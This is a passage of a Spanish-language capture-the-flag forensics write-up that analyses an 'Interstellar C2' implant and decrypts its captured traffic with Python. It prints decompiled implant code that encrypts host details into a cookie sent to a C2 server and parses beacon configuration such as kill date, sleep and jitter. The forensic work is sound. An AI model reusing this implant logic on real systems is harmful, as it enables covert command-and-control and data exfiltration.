+<span class="mtk1">      </span><span class="mtk8 mtku">SymmetricAlgorithm</span><span class="mtk1"> symmetricAlgorithm2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CreateCam</span><span class="mtk1">(key, </span><span class="mtk6">null</span><span class="mtk1">, rij: </span><span class="mtk6">false</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">byte</span><span class="mtk1">[] second2 </span><span class="mtk5">=</span><span class="mtk1"> symmetricAlgorithm2.</span><span class="mtk8">CreateEncryptor</span><span class="mtk1">().</span><span class="mtk8">TransformFinalBlock</span><span class="mtk1">(array, </span><span class="mtk6">0</span><span class="mtk1">, array.Length);</span>  
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> Convert.</span><span class="mtk8">ToBase64String</span><span class="mtk1">(</span><span class="mtk8">Combine</span><span class="mtk1">(symmetricAlgorithm2.IV, second2));</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Esta función usa AES con la clave proporcionada para cifrar algunos datos (<code>un</code>). Esta función podría comprimir el texto en texto claro antes de cifrar con <code>Compress</code> (compresión GZIP):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">byte</span><span class="mtk1">[] </span><span class="mtk8">Compress</span><span class="mtk1">(</span><span class="mtk5">byte</span><span class="mtk1">[] raw)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    using </span><span class="mtk8 mtku">MemoryStream</span><span class="mtk1"> memoryStream </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">MemoryStream</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">using</span><span class="mtk1"> (</span><span class="mtk8 mtku">GZipStream</span><span class="mtk1"> gZipStream </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">GZipStream</span><span class="mtk1">(memoryStream, CompressionMode.Compress, leaveOpen</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">))</span>  
+<span class="mtk1">    {</span>
+<span class="mtk1">      gZipStream.</span><span class="mtk8">Write</span><span class="mtk1">(raw, </span><span class="mtk6">0</span><span class="mtk1">, raw.Length);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> memoryStream.</span><span class="mtk8">ToArray</span><span class="mtk1">();</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>El resultado de <code>Encryption</code> es el IV (16 bytes) más el texto cifrado en codificación Base64.</p><p>Recordemos que la salida de <code>Encryption(key, un)</code> se pasaba a <code>GetWebRequest</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8 mtku">WebClient</span><span class="mtk1"> </span><span class="mtk8">GetWebRequest</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> cookie)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">try</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      ServicePointManager.SecurityProtocol </span><span class="mtk5">=</span><span class="mtk1"> SecurityProtocolType.Tls </span><span class="mtk5">|</span><span class="mtk1"> SecurityProtocolType.Tls11 </span><span class="mtk5">|</span><span class="mtk1"> SecurityProtocolType.Tls12;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> ex)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(ex.Message);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">WebClient</span><span class="mtk1"> webClient </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">WebClient</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> password </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">string.</span><span class="mtk8">IsNullOrEmpty</span><span class="mtk1">(text))</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">WebProxy</span><span class="mtk1"> webProxy </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">WebProxy</span><span class="mtk1">();</span>
+<span class="mtk1">      webProxy.Address </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Uri</span><span class="mtk1">(text);</span>
+<span class="mtk1">      webProxy.Credentials </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">NetworkCredential</span><span class="mtk1">(text2, password);</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (string.</span><span class="mtk8">IsNullOrEmpty</span><span class="mtk1">(text2))</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        webProxy.UseDefaultCredentials </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      webProxy.BypassProxyOnLocal </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">      webClient.Proxy </span><span class="mtk5">=</span><span class="mtk1"> webProxy;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (webClient.Proxy </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      webClient.Proxy</span><span class="mtk5">!</span><span class="mtk1">.Credentials </span><span class="mtk5">=</span><span class="mtk1"> CredentialCache.DefaultCredentials;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> value </span><span class="mtk5">=</span><span class="mtk1"> dfarray[dfs].</span><span class="mtk8">Replace</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\"</span><span class="mtk4">"</span><span class="mtk1">, string.Empty).</span><span class="mtk8">Trim</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">string.</span><span class="mtk8">IsNullOrEmpty</span><span class="mtk1">(value))</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      webClient.Headers.</span><span class="mtk8">Add</span><span class="mtk1">(</span><span class="mtk4">"Host"</span><span class="mtk1">, value);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    webClient.Headers.</span><span class="mtk8">Add</span><span class="mtk1">(</span><span class="mtk4">"User-Agent"</span><span class="mtk1">, </span><span class="mtk4">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWe</span><span class="mtk4">bKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.1</span><span class="mtk4">22 Safari/537.36"</span><span class="mtk1">);</span>  
+<span class="mtk1">    webClient.Headers.</span><span class="mtk8">Add</span><span class="mtk1">(</span><span class="mtk4">"Referer"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (cookie </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      webClient.Headers.</span><span class="mtk8">Add</span><span class="mtk1">(HttpRequestHeader.Cookie, </span><span class="mtk4">$"SessionID={</span><span class="mtk1">cookie</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> webClient;</span>
+<span class="mtk1">  }</span>
+</code></pre></div><h2 id="varios-descifrados">Varios descifrados</h2><p>Como se puede ver, la información cifrada está presente en la cabecera <code>Cookie</code>:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-6.webp" alt="Interstellar C2 6"></p><p>Intentemos descifrarla:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; from Crypto.Cipher import AES
+&gt;&gt;&gt; from base64 import b64decode as b64d
+&gt;&gt;&gt;
+&gt;&gt;&gt; key = b64d('DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=')
+&gt;&gt;&gt; enc = b64d('9kx6dwfjkvpCrgA6Zr0Uyq9vv8hFR4G/1UiAtxFd/ERlJLGjlGeLrck85YBMyBfEfSpJzwZRVuiHgxSaFXbT8vdB6QqsurfO8Iaudfu0Gh8=')  
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt; cipher.decrypt(ct)
+b'DESKTOP;DESKTOP\\IEUser*;DESKTOP;AMD64;6796;tmp7102591;1\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+</code></pre></div><p>Genial, hemos descifrado con éxito la información de la máquina (aunque es irrelevante).</p><p>Después de esta etapa, el programa toma los datos de respuesta, los descifra (guardado como <code>text2</code>) y los procesa (todavía en la función <code>primer</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">    // ...</span>
+
+<span class="mtk1">    </span><span class="mtk8 mtku">Regex</span><span class="mtk1"> regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"RANDOMURI19901(.*)10991IRUMODNAR"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">Match</span><span class="mtk1"> match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> randomURI </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"URLS10484390243(.*)34209348401SLRU"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> stringURLS </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"KILLDATE1665(.*)5661ETADLLIK"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> killDate </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"SLEEP98001(.*)10089PEELS"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> sleep </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"JITTER2025(.*)5202RETTIJ"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> jitter </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"NEWKEY8839394(.*)4939388YEKWEN"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> key2 </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"IMGS19459394(.*)49395491SGMI"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> stringIMGS </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk8">ImplantCore</span><span class="mtk1">(text3, randomURI, stringURLS, killDate, sleep, ke</span><span class="mtk1">y2, stringIMGS, jitter);</span>  
+<span class="mtk1">  }</span>
+</code></pre></div><p>Entonces, tomamos el <em>payload</em> de Base64 y lo desciframos con AES:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; with open('kettie.b64') as f:
+...     enc = b64d(f.read())
+...
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)  
+&gt;&gt;&gt;
+&gt;&gt;&gt; data = cipher.decrypt(ct)
+&gt;&gt;&gt; data[:20]
+b'ClJBTkRPTVVSSTE5OTAx'
+</code></pre></div><p>Parece que los datos descifrados están nuevamente codificados en Base64. Se puede ver en <code>Decryption</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> </span><span class="mtk8">Decryption</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> key, </span><span class="mtk5">string</span><span class="mtk1"> enc)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">byte</span><span class="mtk1">[] array </span><span class="mtk5">=</span><span class="mtk1"> Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(enc);</span>
+<span class="mtk1">    </span><span class="mtk5">byte</span><span class="mtk1">[] array2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk5">byte</span><span class="mtk1">[</span><span class="mtk6">16</span><span class="mtk1">];</span>
+<span class="mtk1">    Array.</span><span class="mtk8">Copy</span><span class="mtk1">(array, array2, </span><span class="mtk6">16</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">try</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">SymmetricAlgorithm</span><span class="mtk1"> symmetricAlgorithm </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CreateCam</span><span class="mtk1">(key, Convert.</span><span class="mtk8">ToBase64String</span><span class="mtk1">(array2));</span>
+<span class="mtk1">      </span><span class="mtk5">byte</span><span class="mtk1">[] bytes </span><span class="mtk5">=</span><span class="mtk1"> symmetricAlgorithm.</span><span class="mtk8">CreateDecryptor</span><span class="mtk1">().</span><span class="mtk8">TransformFinalBlock</span><span class="mtk1">(array, </span><span class="mtk6">16</span><span class="mtk1">, array.Length </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> Encoding.UTF8.</span><span class="mtk8">GetString</span><span class="mtk1">(Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(Encoding.UTF8.</span><span class="mtk8">GetString</span><span class="mtk1">(bytes).</span><span class="mtk8">Trim</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk5">char</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">])));</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">catch</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">SymmetricAlgorithm</span><span class="mtk1"> symmetricAlgorithm2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CreateCam</span><span class="mtk1">(key, Convert.</span><span class="mtk8">ToBase64String</span><span class="mtk1">(array2), rij: </span><span class="mtk6">false</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">byte</span><span class="mtk1">[] bytes2 </span><span class="mtk5">=</span><span class="mtk1"> symmetricAlgorithm2.</span><span class="mtk8">CreateDecryptor</span><span class="mtk1">().</span><span class="mtk8">TransformFinalBlock</span><span class="mtk1">(array, </span><span class="mtk6">16</span><span class="mtk1">, array.Length </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> Encoding.UTF8.</span><span class="mtk8">GetString</span><span class="mtk1">(Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(Encoding.UTF8.</span><span class="mtk8">GetString</span><span class="mtk1">(bytes2).</span><span class="mtk8">Trim</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk5">char</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">])));</span>  
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">finally</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Array.</span><span class="mtk8">Clear</span><span class="mtk1">(array, </span><span class="mtk6">0</span><span class="mtk1">, array.Length);</span>
+<span class="mtk1">      Array.</span><span class="mtk8">Clear</span><span class="mtk1">(array2, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">16</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Entonces, vamos a decodificarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; data = b64d(data)
+&gt;&gt;&gt; data[:20]
+b'\nRANDOMURI19901dVfhJ'
+&gt;&gt;&gt; data.decode()
+'\nRANDOMURI19901dVfhJmc2ciKvPOC10991IRUMODNAR\nURLS10484390243"Kettie/Emmie/Anni?Theda=Merrilee", "Rey/Odele/Betsy/Evaleen/Lynnette?Violetta=Alie", "Wilona/Sybila/Pearla/Mair/Dannie/Darcie/Katerina/Irena/Missy/Ketty/", "Hedwiga/Pamelina/Lisette/Sibylla/Jana/Lise/Kellen/Daniela/Alika/", "Arlinda/Chelsae/Milka/Alexine/Mona/Catherin/Charmain/Deborah/", "Melessa/Anabelle/Bibbye/Candis/Jacqueline/Lacee/Nicola/Belvia?Lexi=Veronika", "Janith/Mona/Kimberlee/Flossi/Darcie/Doralia/Aloysia/Gracia/Antonella?Othella=Jewelle", "Vere/Maddalena/Kara/Thomasina/Alisha/Amargo/Carrissa/", "Harlie/Fanya/Jehanna/Jane/Tami/Sissy/", "Catlaina/Nikaniki/Sonja/Denni/Kelsey/Allis/Cherry?Hayley=Rosalind", "Gerry/June/Charissa/Blondy/Sharity/Lory?Loise=Maribelle", "Ariadne/Marianna/Betti/Samaria/Carmon/Tandy/Charissa/Sherrie/Felipa/Crissy/", "Glennis/Elfrieda/Fannie/Nola/Janetta/Darda/Kathi/Britte?Berta=Lidia", "Georgeta/Sharron/Cynthy/Roseanna/", "Morganne/Mamie/Arlee/Suki/Uta/Anett/Sena/Babette/Anderea?Hally=Karie", "Zondra/Tasha/Rey/Eolande/Rianon/Alla/Trula/Cynthea/Glyn?Jamima=Ethyl", "Edi/Phyllys/Marga/Jaquith/Ray/Lynnell/Flory?Angelle=Betteanne", "Ciel/Constantine/Catlee?Cecile=Karina", "Kaylee/Guglielma/Clementia/Ilka/", "Zoe/Delora/Christi/Carolan/Barbi/Myrta/Cherie/Halie/", "Brandy/Joanna/Afton/Jana?Chelsea=Truda", "Aveline/Alethea/Rona/Janka/Danila/Robbyn/Glynda/Stormi/", "Tamiko/Carine/Juliann/", "Jacenta/Hatti?Tatiana=Franny", "Hyacinth/", "Merrili/Gabrila/Harmony/Erda/", "Mirelle/Imogene/Rivalee/Ayn/Courtenay?Jania=Jerrylee", "Imogen/Ketti/Kari/Sam/Maurise?Shirlene=Eugenia", "Melinda/Lianne/Blancha/Silvie/Gracia/Zaneta/Lyda/Dalia/Tracie/", "Fanchette/Marlyn/Casey/Bobbye/Elayne/Charmane/", "Cissiee/Maxy/Madalyn/Esme/Esther/Barbette/Starla/Vin/Corrinne/Meggy/Joete?Glenna=Aida", "Kirsteni/Nelie/Lauralee/Stefanie/Haily/Annecorinne/Nettle/Natka?Jenda=Ursuline", "Elinore/", "Maisie/Hedwig/Natividad?Gisela=Ollie", "Roselle/Philippa/Noellyn/Zarah/Tillie/Koral/Laurette/Lelah/Kylynn/Cassaundra/Jordanna?Stormy=Vally", "Abbi/Rania/Vivienne/Engracia/Adel/Ange/Tonye/Rosemaria/Gretta/Guinna/Jehanna?Linnet=Daria", "Mamie/Eddi/Eddi/Tanitansy/Timmy/Willie/Catie/Gisela/Sheri/", "Helaina/Theadora/Malinda/Linnie/Jaquith/Ailyn/Magda?Sisile=Vonnie", "Faunie/Dionne/Shelbi/Zorana/Pearline/Rozanna/Kandace/Fanchon?Anna-Diana=Lorelei", "Waneta/Marnie/Jessalyn/Jaynell/Holli/Kassi/Euphemia/Katerine?Minda=Dawna", "Kikelia/Jacinthe/Adorne/Kariotta/Lonee/Krystalle/", "Constancia/Dynah?Allene=Moyra", "Donetta/", "Sallie/Lindie/Denni/", "Jeannine/Lucretia/Denna/Prudy/Hendrika/Ilysa/Caroljean?Aline=Tine"34209348401SLRU\nKILLDATE16652025-01-015661ETADLLIK\nSLEEP980013s10089PEELS\nJITTER20250.25202RETTIJ\nNEWKEY8839394nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=4939388YEKWEN\nIMGS19459394"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